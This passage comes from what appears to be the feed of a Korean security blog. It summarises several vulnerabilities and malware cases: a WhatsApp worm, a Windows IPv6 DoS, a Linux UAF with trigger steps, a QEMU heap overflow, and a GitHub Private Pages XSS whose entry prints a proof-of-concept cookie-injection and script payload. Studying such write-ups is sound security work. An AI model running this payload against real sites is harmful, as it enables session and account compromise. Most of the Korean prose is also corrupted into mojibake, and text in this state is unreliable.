í…ŒìŠ¤íŠ¸í•´ë³´ì.</p><p><img src="/2021/04/11/idioth/arch_of_ransomware_part1/Untitled%203.png"></p><blockquote><p>Generating both keys</p></blockquote><p><img src="/2021/04/11/idioth/arch_of_ransomware_part1/Untitled%204.png"></p><blockquote><p>Public key</p></blockquote><p><img src="/2021/04/11/idioth/arch_of_ransomware_part1/Untitled%205.png"></p><blockquote><p>Private key</p></blockquote><p>íŒŒíŠ¸ 1ì€ ì—¬ê¸°ê¹Œì§€ì´ë‹¤. íŒŒíŠ¸ 2ì—ì„œëŠ” ë©€ì›¨ì–´ë¥¼ ì½”ë”©í•˜ê³  ì–¼ë§ˆë‚˜ ë¹ ë¥´ê²Œ íŒŒì¼ì„ ì•”í˜¸í™”í•  ìˆ˜ ìˆëŠ”ì§€ ì‹œì—°í•´ ë³¼ ê²ƒì´ë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>malware</tag>
      
      <tag>crypto</tag>
      
      <tag>ransomware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] WhatsAppì„ í†µí•´ í¼ì§„ ì•ˆë“œë¡œì´ë“œ Malware</title>
    <link href="/2021/04/10/fabu1ous/2021-04-10/"/>
    <url>/2021/04/10/fabu1ous/2021-04-10/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://research.checkpoint.com/2021/new-wormable-android-malware-spreads-by-creating-auto-replies-to-messages-in-whatsapp/">WhatsApp Auto-reply Malware</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Android WhatsApp</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Check Point Researchê°€ Google Play Storeì—ì„œ ì‚¬ìš©ìì˜ WhatsApp ë©”ì‹œì§€ë¥¼ í†µí•´ í™•ì‚°ë˜ëŠ” ì•…ì„± ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ë°œê²¬í–ˆìŠµë‹ˆë‹¤. í•´ë‹¹ ì•…ì„± ì•±ì€ Flix Onlineì´ë¼ëŠ” ì´ë¦„ìœ¼ë¡œ Google Play Storeì— ë“±ë¡ë˜ì–´ ìˆì—ˆê³  í”¼í•´ìì˜ ëª¨ë°”ì¼ ê¸°ê¸° ì† WhatsApp ë©”ì‹œì§€ë¡œ í™•ì‚°ë˜ëŠ” ì›œ(Worm)ì…ë‹ˆë‹¤. Check PointëŠ” WhatsAppê³¼ ê°™ì´ ì •ìƒì ì¸ ì•±ì˜ ë°ì´í„°ë¥¼ ì¡°ì‘í•˜ê±°ë‚˜ íƒˆì·¨í•  ìˆ˜ ìˆë‹¤ëŠ” ì ì—ì„œ í•´ë‹¹ ì›œì„ í˜ì‹ ì ì´ê³  ìœ„í—˜í•œ ìƒˆë¡œìš´ ê¸°ìˆ ì´ë¼ í‰ê°€í•˜ê³  ìˆìŠµë‹ˆë‹¤.</p><p>Flix Onlineì´ ê¸°ê¸°ì— ì„¤ì¹˜ë˜ë©´ ì‚¬ìš©ìì—ê²Œ â€˜Overlayâ€™, â€˜Battery Optimization Ignoreâ€™, â€˜Notificationâ€™ ê¶Œí•œì„ ìš”ì²­í•©ë‹ˆë‹¤. ì´ì¤‘ í•µì‹¬ì´ ë˜ëŠ” â€˜Notificationâ€™ ê¶Œí•œì€ Flix Onlineì´ ëª¨ë°”ì¼ ê¸°ê¸°ê°€ ë°›ëŠ” ëª¨ë“  ë©”ì‹œì§€ì— ëŒ€í•œ ì•Œë¦¼ì— ì ‘ê·¼, ë‹µì¥, í•´ì œí•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. Flix Onlineì€ <code>OnNotificationPosted</code> ì½œë°±ì„ ì‚¬ìš©í•´ ì•Œë¦¼ íŒ¨í‚¤ì§€ì˜  <code>status.BarNotification0.getPackageName()</code>ì„ ê²€ì‚¬í•´ ì•Œë¦¼ íŒ¨í‚¤ì§€ì˜ ê·¼ì›ì§€ê°€ WhatsAppì¸ì§€ íŒë‹¨í•©ë‹ˆë‹¤. ê·¸ í›„ í•´ë‹¹ ì•Œë¦¼ì„ ì œê±°í•¨ê³¼ ë™ì‹œì— ì œëª© ë° ë‚´ìš©ì„ íƒˆì·¨í•©ë‹ˆë‹¤. ë˜í•œ Inline reply ì»´í¬ë„ŒíŠ¸ë¥¼ ì‚¬ìš©í•´ ì¶”ê°€ ê°ì—¼ì„ ìœ„í•œ ë‹µì¥ì„ ì „ì†¡í•©ë‹ˆë‹¤.</p><p>ë‘ ë‹¬ ë™ì•ˆ Flix Online ì•±ì€ ì•½ 500ë²ˆ ë‹¤ìš´ë¡œë“œë˜ì—ˆê³  í˜„ì¬ëŠ” Google Play Storeì—ì„œ ì‚­ì œë˜ì—ˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>android</tag>
      
      <tag>malware</tag>
      
      <tag>whatsapp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-24086: Windows IPv6 denial of service vulnerability </title>
    <link href="/2021/04/09/l0ch/2021-04-09/"/>
    <url>/2021/04/09/l0ch/2021-04-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.quarkslab.com/analysis-of-a-windows-ipv6-fragmentation-vulnerability-cve-2021-24086.html">Analysis of a Windows IPv6 Fragmentation Vulnerability: CVE-2021-24086</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoftê°€ 2ì›”ì— íŒ¨ì¹˜í•œ Windowsì˜ IPv6 ì„œë¹„ìŠ¤ ê±°ë¶€ ì·¨ì•½ì ì— ëŒ€í•œ ì„¸ë¶€ ë¶„ì„ ì •ë³´ê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>IPv6 source nodeëŠ” ìµœëŒ€ ì „ì†¡ ë‹¨ìœ„(MTU) ë³´ë‹¤ í° íŒ¨í‚·ì„ ë³´ë‚´ê¸° ìœ„í•´ íŒ¨í‚·ì„ ì¡°ê°í™”(Fragmentation)í•´ ì „ì†¡í•˜ê³  ì´ë¥¼ ìˆ˜ì‹ í•  ë•Œ ë‹¤ì‹œ ì¡°ë¦½í•©ë‹ˆë‹¤. Windowsì—ì„œëŠ” IPv6 íŒ¨í‚·ì˜ ì¤‘ì²© ì¡°ê°í™”ë¥¼ í—ˆìš©í•´ ì¡°ê°í™”ëœ IPv6 íŒ¨í‚·ì— ë‹¤ë¥¸ ì¡°ê°í™”ëœ íŒ¨í‚·ì„ êµ¬ì„±í•  ìˆ˜ ìˆëŠ”ë°,  ì¡°ê°í™”ëœ íŒ¨í‚·ì„ ì¬ì¡°ë¦½í•˜ëŠ” <code>tcpip!Ipv6pReassembleDatagram</code> ì—ì„œ NULL í¬ì¸í„° ì—­ì°¸ì¡° ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤.</p><p>ìˆ˜ì‹ í•œ ì¡°ê°í™” íŒ¨í‚·ì„ ì²˜ë¦¬í•˜ëŠ” <code>tcpip!Ipv6pReceiveFragment</code>ëŠ” ì¤‘ì²©ëœ ì¡°ê°í™” íŒ¨í‚·ì„ ìˆ˜ì‹ í•˜ë©´  <code>tcpip!Ipv6pReassembleDatagram</code>ì„ ì¬ê·€ì ìœ¼ë¡œ í˜¸ì¶œí•©ë‹ˆë‹¤. í•´ë‹¹ í•¨ìˆ˜ëŠ” í™•ì¥ í—¤ë”ì˜ í¬ê¸°ë¥¼ 1500ìœ¼ë¡œ ì œí•œí•œ ë’¤ <code>NdisGetDataBuffer</code> ë¥¼ í˜¸ì¶œí•´ íŒ¨í‚· ë°ì´í„°ê°€ ìˆëŠ” <code>NET_BUFFER</code> êµ¬ì¡°ì²´ì—ì„œ í™•ì¥ í—¤ë” í¬ê¸° + íŒ¨í‚· í—¤ë” í¬ê¸°(<code>0x28</code> ê³ ì •)ë§Œí¼ì„ ì½ì–´ ë°˜í™˜í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì¤‘ì²©ëœ ì¡°ê°í™” íŒ¨í‚·ì˜ í™•ì¥ í—¤ë”ì˜ í¬ê¸°ë¥¼ ì œí•œí•˜ì§€ ì•Šì•„ í™•ì¥ í—¤ë” í¬ê¸°ê°€ <code>0xffd0</code>ë©´<code>NdisGetDataBuffer</code> í•¨ìˆ˜ëŠ” <code>0xffd0 + 0x28(íŒ¨í‚· í—¤ë”) = 0xfff8</code> í¬ê¸°ë§Œí¼ ì½ê³  NULLì„ ë°˜í™˜í•©ë‹ˆë‹¤. ê²°ê³¼ì ìœ¼ë¡œ ë°˜í™˜ëœ NULL ê°’ì„ <code>tcpip!Ipv6pReassembleDatagram</code> ì—ì„œ ì°¸ì¡°í•˜ê²Œ ë˜ê³  NULL í¬ì¸í„° ì—­ì°¸ì¡° ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì€ ì•…ì„± UDP íŒ¨í‚·ì„ IPv6ë¥¼ í†µí•´ ì „ì†¡í•˜ì—¬ ì›ê²©ìœ¼ë¡œ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆëŠ” ê²ƒìœ¼ë¡œ ì•Œë ¤ì¡ŒìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>denial of service</tag>
      
      <tag>null pointer dereference</tag>
      
      <tag>ipv6</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-3483: Linux kernelì˜ nosy driverì—ì„œ ë°œê²¬ëœ UAF bug</title>
    <link href="/2021/04/08/insu/2021-04-08/"/>
    <url>/2021/04/08/insu/2021-04-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2021/q2/10">CVE-2021-3483: Linux kernel: a use-after-free bug in nosy driver</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Linux Kernel</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Linux Kernelì˜ <code>Linux/drivers/firewire/nosy.c</code>ì—ì„œ UAF ë²„ê·¸ê°€ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>NosyëŠ” IEEE 1394 ë“œë¼ì´ë²„, ì• í”Œë¦¬ì¼€ì´ì…˜ ë˜ëŠ” íŒì›¨ì–´ ê°œë°œê³¼ í”„ë¡œí† ì½œ ë¶„ì„ì— ì‚¬ìš©ë˜ëŠ” IEEE 1394 íŒ¨í‚· ìŠ¤ë‹ˆí¼ì´ë©° nosy driverëŠ” ê°ê°ì˜ deviceì—ì„œ <a href="https://docs.huihoo.com/doxygen/linux/kernel/3.7/structpcilynx.html">pcilynx structure</a>ë¥¼ í• ë‹¹í•©ë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì€ nosy driverê°€ deviceì— pciynx structureë¥¼ í• ë‹¹í•˜ê³  í•´ì œí•˜ëŠ” ê³¼ì •ì—ì„œ ë°œìƒí•˜ë©° ì·¨ì•½ì ì´ ë°œìƒí•˜ëŠ” ì‹œë‚˜ë¦¬ì˜¤ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li>ì²˜ìŒ nosy deviceë¥¼ ì—´ê³  <code>NOSY_IOC_START</code> ioctl ì»¤ë§¨ë“œë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. ê·¸ëŸ¼ client Aê°€ í• ë‹¹ë˜ê³ , doubly linked listì— ì¶”ê°€ë©ë‹ˆë‹¤.</li><li>ë‘ë²ˆì§¸ë¡œ, nosy deviceë¥¼ ì—´ê³  <code>NOSY_IOC_START</code> ioctl ì»¤ë§¨ë“œë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. ê·¸ëŸ¼ client Bê°€ í• ë‹¹ë˜ê³  ë˜‘ê°™ì´ doubly linked listì— ì¶”ê°€ ë©ë‹ˆë‹¤.</li><li>client Aì—ì„œ <code>NOSY_IOC_START ioctl</code> ì»¤ë§¨ë“œë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. ê·¸ëŸ¼ client AëŠ” doubly linked listì—ì„œ ì½ì–´ì§€ê³ , doubly linked listëŠ” ì—‰ë§ì´ ë©ë‹ˆë‹¤.</li><li>ì²˜ìŒ nosy deviceë¥¼ ë‹«ìœ¼ë©´ <code>nosy_release</code>ê°€ í˜¸ì¶œë˜ë©° <code>nosy_release</code> ì—ì„œ client Aê°€ unlink ë˜ê³  free ë©ë‹ˆë‹¤.</li><li>ë‘ë²ˆì§¸ nosy deviceë¥¼ ë‹«ìœ¼ë©´, client Aê°€ ì°¸ì¡°ë˜ì–´ UAFê°€ ë°œìƒí•©ë‹ˆë‹¤.</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>insu</tag>
      
      <tag>uaf</tag>
      
      <tag>nosy driver</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Github Private Pages XSS ì·¨ì•½ì </title>
    <link href="/2021/04/08/idioth/2021-04-08/"/>
    <url>/2021/04/08/idioth/2021-04-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://robertchen.cc/blog/2021/04/03/github-pages-xss">Breaking GitHub Private Pages for $35k</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>github private pages</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Github Private Pagesì—ì„œ XSS ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ github private pagesì˜ custom authentication flow ê³¼ì • ì¤‘ <code>__Host-</code> prefixë¥¼ ìš°íšŒí•˜ê³  <code>page_id</code> íŒŒë¼ë¯¸í„°ë¥¼ í†µí•´ ë°œìƒí•©ë‹ˆë‹¤.</p><p>github pagesëŠ” ë³„ë„ì˜ <code>github.io</code> ë„ë©”ì¸ì—ì„œ í˜¸ìŠ¤íŒ… ë˜ì–´ <code>github.com</code> ì¸ì¦ ì¿ í‚¤ê°€ private pages serverë¡œ ì „ì†¡ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë”°ë¼ì„œ private page authenticationì€ <code>github.com</code>ê³¼ì˜ ì¶”ê°€ì ì¸ í†µí•© ì—†ì´ëŠ” ì‚¬ìš©ì ì¸ì¦í•  ë°©ë²•ì´ ì—†ìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ì´ìœ ë¡œ githubì€ custom authentication flowë¥¼ ë§Œë“¤ì—ˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì  ì œë³´ ë‹¹ì‹œ github private pagesì˜ custom authentication flowëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li>private pageì— ì ‘ì†í•˜ë©´ ì„œë²„ëŠ” <code>__Host-gh_pages_token</code>ê°€ ì¡´ì¬í•˜ëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤. ì¿ í‚¤ê°€ ì—†ê±°ë‚˜ ì˜ëª» ì„¤ì •ëœ ê²½ìš° <code>https://github.com/login</code>ìœ¼ë¡œ ë¦¬ë‹¤ì´ë ‰íŠ¸ ë©ë‹ˆë‹¤. initial redirectëŠ” <code>__Host-gh_pages_session</code> ì¿ í‚¤ì— nonceë¥¼ ì €ì¥í•©ë‹ˆë‹¤. í•´ë‹¹ ì¿ í‚¤ëŠ” <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#attributes">__Host- cookie prefix</a>ë¥¼ ì‚¬ìš©í•˜ì—¬ í˜¸ìŠ¤íŠ¸ê°€ ì•„ë‹Œ ë„ë©”ì¸ì´ JavaScriptì—ì„œ ì„¤ì •ë˜ëŠ” ê²ƒì„ ë°©ì§€í•©ë‹ˆë‹¤.</li><li><code>/login</code>ì€ <code>/pages/auth?nonce=&amp;page_id=&amp;path=</code>ë¡œ ë¦¬ë‹¤ì´ë ‰íŠ¸ ë©ë‹ˆë‹¤. ì´ ì—”ë“œí¬ì¸íŠ¸ëŠ” ì„ì‹œ ì¸ì¦ í† í°ì„ ìƒì„±í•˜ì—¬ <code>token</code> íŒŒë¼ë¯¸í„°ì— <code>https://pages-auth.github.com/redirect</code>ì— ì „ë‹¬í•©ë‹ˆë‹¤. <code>nonce</code>, <code>page_id</code>, <code>path</code>ëŠ” ë¹„ìŠ·í•˜ê²Œ ì „ë‹¬ë©ë‹ˆë‹¤.</li><li><code>/redirect</code>ëŠ” <code>https://repo.org.github.io/__/auth</code>ë¡œ ë°”ë¡œ ì´ë™í•©ë‹ˆë‹¤. ë§ˆì§€ë§‰ ì—”ë“œí¬ì¸íŠ¸ëŠ” <code>repo.org.github.io</code> ë„ë©”ì¸, <code>__Host-gh_pages_token</code>, <code>__Host-gh_pages_id</code>ì— ì¸ì¦ ì¿ í‚¤ë¥¼ ì„¤ì •í•©ë‹ˆë‹¤. ë˜í•œ ì´ì „ì— ì„¤ì •ëœ <code>__Host-gh_pages_session</code>ì˜ <code>nonce</code>ë„ í™•ì¸í•©ë‹ˆë‹¤.</li><li>authentication flowì—ì„œ original request pathì™€ page id ê°™ì€ ì •ë³´ëŠ” <code>path</code>ì™€ <code>page_id</code> ì¿¼ë¦¬ íŒŒë¼ë¯¸í„°ì— ì €ì¥ë©ë‹ˆë‹¤. nonceëŠ” <code>nonce</code> íŒŒë¼ë¯¸í„°ì—ì„œ ì „ë‹¬ë©ë‹ˆë‹¤.</li></ol><p><code>https://repo.org.github.io/__/auth</code>ì˜  <code>page_id</code> íŒŒë¼ë¯¸í„°ëŠ” whitespaceë¥¼ ë¬´ì‹œí•˜ì—¬ íŒŒì‹± ë˜ê³  ì •ìˆ˜ë¡œ ë³€í™˜ë˜ì–´ <code>Set-Cookie</code> í—¤ë”ì— ë Œë”ë§ ë©ë‹ˆë‹¤. <code>page_id=12345%0d%0a%0d%0a</code>ë¥¼ ì „ì†¡í•˜ì—¬ <code>Set-Cookie</code> í—¤ë” ë’¤ì— ìœ„ì¹˜í•œ Location í—¤ë”ë¥¼ ë¬´ì‹œí•˜ê³  body contentë¥¼ ë Œë”ë§í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ <code>page_id</code>ì—ì„œ null byteë¥¼ ë§Œë‚˜ë©´ integer parsingì´ ì¢…ë£Œë©ë‹ˆë‹¤. í—¤ë”ì— null byteê°€ ì¡´ì¬í•˜ë©´ responseê°€ reject ë˜ë¯€ë¡œ bodyì˜ ì‹œì‘ ë¶€ë¶„ì— null byteë¥¼ ì‚½ì…í•˜ì—¬ XSSë¥¼ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs latex">&quot;?page_id&quot; + encodeURIComponent(&quot;<span class="hljs-tag">\<span class="hljs-name">r</span></span><span class="hljs-tag">\<span class="hljs-name">n</span></span><span class="hljs-tag">\<span class="hljs-name">r</span></span><span class="hljs-tag">\<span class="hljs-name">n</span></span><span class="hljs-tag">\<span class="hljs-name">x</span></span>00&lt;script&gt;alert(origin)&lt;/script&gt;&quot;)</code></pre><p>í•˜ì§€ë§Œ nonceê°€ ì¡°ì‘ëœ <code>page_id</code>ì˜ ì „ì†¡ì„ ë°©ì§€í•˜ì—¬ ì´ë¥¼ ìš°íšŒí•˜ì—¬ì•¼ í•©ë‹ˆë‹¤. ë¸Œë¼ìš°ì €ì—ì„œ ì¿ í‚¤ì˜ ëŒ€ì†Œë¬¸ìë¥¼ ë‹¤ë¥´ê²Œ ì²˜ë¦¬í•˜ì—¬ <code>__Host-</code>ì™€ <code>__HOST-</code>ë¥¼ ë‹¤ë¥´ê²Œ ì²˜ë¦¬í•©ë‹ˆë‹¤. í•˜ì§€ë§Œ github private page serverì—ì„œëŠ” ì¿ í‚¤ë¥¼ íŒŒì‹±í•  ë•Œ ëŒ€ì†Œë¬¸ìë¥¼ ë¬´ì‹œí•˜ë¯€ë¡œ <code>__Host-</code> prefix ìš°íšŒê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤. ì „ì²´ì ì¸ POCëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs perl">&lt;script&gt;const id = location.search.substring(<span class="hljs-string">&quot;?id=&quot;</span>.length)document.cookie = <span class="hljs-string">&quot;__HOST-gh_pages_session=dea8c624-468f-4c5b-a4e6-9a32fe6b9b15; domain=.private-org.github.io&quot;</span>;location = <span class="hljs-string">&quot;https://github.com/pages/auth?nonce=dea8c624-468f-4c5b-a4e6-9a32fe6b9b15&amp;page_id=&quot;</span> + id + <span class="hljs-string">&quot;%0d%0a%0d%0a%00&lt;script&gt;alert(origin)%3c%2fscript&gt;&amp;path=Lw&quot;</span>;&lt;<span class="hljs-regexp">/script&gt;</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss</tag>
      
      <tag>idioth</tag>
      
      <tag>github</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-3409: QEMU Heap overflow in SDHCI</title>
    <link href="/2021/04/07/fabu1ous/2021-04-07/"/>
    <url>/2021/04/07/fabu1ous/2021-04-07/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://starlabs.sg/advisories/21-3409/">CVE-2021-3409</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>QEMU 5.2.50</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>QEMU 5.2.50 ì½”ë“œì˜ SDHCI(Secure Digital Host Controller Interface) ì»´í¬ë„ŒíŠ¸ëŠ” Heap buffer overflow ì·¨ì•½ì ì´ ìˆìŠµë‹ˆë‹¤. SDHCIëŠ” ë¹„íœ˜ë°œì„± ë©”ëª¨ë¦¬ ì¹´ë“œ í¬ë§·ì¸ SDì˜ ì»¨íŠ¸ë¡¤ëŸ¬ ì—ë®¬ë ˆì´ì…˜ì…ë‹ˆë‹¤.</p><pre><code class="hljs python">begin = s-&gt;data_count;         <span class="hljs-keyword">if</span> ((length + begin) &lt; block_size) &#123;             s-&gt;data_count = length + begin;             length = <span class="hljs-number">0</span>;          &#125; <span class="hljs-keyword">else</span> &#123;             s-&gt;data_count = block_size; // [1]             length -= block_size - begin;         &#125;         dma_memory_write(s-&gt;dma_as, dscr.addr,                          &amp;s-&gt;fifo_buffer[begin],                          s-&gt;data_count - begin); // [2]         dscr.addr += s-&gt;data_count - begin;</code></pre><p>ìœ„ ì½”ë“œëŠ” í•¨ìˆ˜ <code>sdhci_do_adma</code>ì˜ ì¼ë¶€ì…ë‹ˆë‹¤. í•¨ìˆ˜ <code>sdhci_do_adma</code>ëŠ” SDHCIì™€ Guest system memory(DMA buffer) ê°„ì— ë°ì´í„° í†µì‹ ì„ ë‹´ë‹¹í•©ë‹ˆë‹¤. ë¸”ë¡ ë²„í¼ë¥¼ ì‚¬ìš©í•œ ë°ì´í„° í†µì‹ ì´ ì´ë£¨ì–´ì§ˆ ë•Œ ë¸”ë¡ ë²„í¼ì— ë“¤ì–´ê°ˆ ë°ì´í„° í¬ê¸°ë¥¼ ê³„ì‚°í•˜ëŠ” ì‹ì€ <code>block_size - s-&gt;data_count</code>ì…ë‹ˆë‹¤. <code>s-&gt;data_count</code>ëŠ” í˜„ì¬ ë¸”ë¡ ë²„í¼ì˜ ì˜¤í”„ì…‹ì„, <code>block_size</code>ëŠ” <code>blksize</code>(0x4 ì˜¤í”„ì…‹ì˜ ë ˆì§€ìŠ¤í„° ê°’)ë¥¼ ë‹´ê³  ìˆê³  ë°ì´í„° í†µì‹ ì´ ì´ë£¨ì–´ì§€ëŠ” ë„ì¤‘ <code>blksize</code>ì˜ ê°’ì„ ë³€ê²½í•  ìˆ˜ ìˆì–´ heap overflow ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì„ ì•…ìš©í•´ Geust systemì„ ëŒ€ìƒìœ¼ë¡œ ì •ë³´ ë…¸ì¶œ, ë°ì´í„° ì¶”ê°€ ë° ìˆ˜ì •, DoS ê³µê²©ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>heap overflow</tag>
      
      <tag>qemu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] ìë°”ìŠ¤í¬ë¦½íŠ¸ ì—”ì§„ Fuzzer - Fuzzilli</title>
    <link href="/2021/04/07/insu/fuzzilli/"/>
    <url>/2021/04/07/insu/fuzzilli/</url>
    
    <content type="html"><![CDATA[<h1 id="Fuzzillië€"><a href="#Fuzzillië€" class="headerlink" title="Fuzzillië€"></a>Fuzzillië€</h1><p>ìë°”ìŠ¤í¬ë¦½íŠ¸ë¥¼ í¼ì§• í•˜ê¸° ìœ„í•´ì„œëŠ” ê¸°ì¡´ì— ìˆëŠ” ë°©ë²•(ëœë¤í•œ ë°ì´í„°ë¥¼ ë§Œë“œëŠ” ë²• ë“±)ì„ ì‚¬ìš©í•´ì„œëŠ” íš¨ìœ¨ì ì¸ í¼ì§•ì„ í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤. </p><p>ê·¸ë ‡ê¸°ì— sampleì„ ë§Œë“¤ ë•Œ ë¬¸ë²•ì— ë§ëŠ” sampleì„ ë§Œë“¤ì–´ì•¼ í•©ë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ <a href="https://github.com/googleprojectzero/domato">domato</a>ë¼ëŠ” grammar-based í¼ì €ê°€ ìˆìŠµë‹ˆë‹¤. domatoëŠ” ì‚¬ìš©ìê°€ ë£°ì„ ë§Œë“¤ì–´ ì¤€ ë’¤ ê·¸ ë£°ì— ë”°ë¼ sampleì„ ë§Œë“­ë‹ˆë‹¤. í•˜ì§€ë§Œ domatoëŠ” ë‹¤ìŒê³¼ ê°™ì€ ë¬¸ì œê°€ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/04/07/insu/fuzzilli/Untitled.png"></p><p><code>v4</code> ê°’ì— ëŒ€í•´ <code>slice</code>í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•  ë•Œ <code>slice</code>ê°€ ì •ì˜ë˜ì–´ ìˆì§€ ì•Šì•„ ë’¤ì— ìˆëŠ” ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤. </p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%201.png"></p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%202.png"></p><p>ì´ë¥¼ í•´ê²°í•˜ê¸° ìœ„í•´ì„œ try-catch ë¬¸ì„ í†µí•´ ì˜ˆì™¸ ì²˜ë¦¬ë¥¼ í•´ì£¼ë©´ ì˜ˆì™¸ê°€ ì¼ì–´ë‚˜ë„ ë‹¤ìŒ ë¬¸ì¥ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ JIT compilerë¡œ ì»´íŒŒì¼ì´ ë˜ë©´ try-catchë¬¸ì´ ì—†ëŠ” ì½”ë“œì™€ëŠ” ì•„ì˜ˆ ë‹¤ë¥¸ ì½”ë“œë¥¼ ìƒì„±í•©ë‹ˆë‹¤. ê·¸ë ‡ê¸°ì— ë†’ì€ ìˆ˜ì¤€ì˜ Semantic correctnessë¥¼ ê°€ì§„ sampleì„ ë§Œë“¤ì–´ì•¼ í•©ë‹ˆë‹¤.</p><p>ì´ë¥¼ ìœ„í•´ì„œëŠ” ëª‡ ê°€ì§€ ë°©ë²•ì´ ìˆëŠ”ë° FuzzillëŠ” mutationì„ í†µí•´ semantically validí•œ ìƒ˜í”Œë§Œ corpusì— ì¶”ê°€í•˜ëŠ” ë°©ë²•ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><p>Fuzzilliì—ì„œëŠ” FuzzILì´ë¼ëŠ” custom intermediate ì–¸ì–´ë¥¼ ë§Œë“¤ì–´ mutationì— ì‚¬ìš©í•©ë‹ˆë‹¤.</p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%203.png"></p><p>ë§Œë“¤ì–´ì§„ FuzzILì€ ë‹¤ìŒ ê·¸ë¦¼ê³¼ ê°™ì´ JS ì½”ë“œë¡œ 